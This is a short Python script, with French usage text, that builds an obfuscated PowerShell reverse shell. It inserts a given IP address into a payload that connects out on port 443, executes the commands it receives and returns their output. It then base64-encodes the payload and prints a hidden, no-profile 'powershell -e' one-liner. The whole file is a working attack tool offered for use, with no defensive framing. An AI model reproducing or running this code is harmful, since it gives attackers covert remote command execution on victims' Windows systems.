import sys, re, base64

if (len(sys.argv) == 2) and (re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]) != None):
    adresse = sys.argv[1]
else:
    print("Utilisation : python3 Encodage_Reverse-shell.py [IP]")
    exit(1)

payload = '$client = New-Object System.Net.Sockets.TCPClient("'+ adresse + '",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

commande = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(commande)

